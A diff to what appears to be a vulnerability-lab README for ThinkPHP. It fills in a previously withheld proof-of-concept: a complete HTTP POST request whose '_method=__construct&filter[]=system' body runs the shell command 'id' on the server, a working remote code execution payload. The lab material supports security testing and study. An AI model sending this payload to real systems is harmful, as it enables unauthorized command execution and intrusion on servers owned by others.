@@ -20,6 +20,20 @@ Visit `http://your-ip:8080` and you'll see the default page of ThinkPHP.
 
 ## POC
 
-Send the packets `****` (the payload will be updated in the future considering the impact. You can test if you know)：
+Send the packets and execute the command `id`:
+
+```
+POST /index.php?s=captcha HTTP/1.1
+Host: localhost
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+```
 
 ![](1.png)
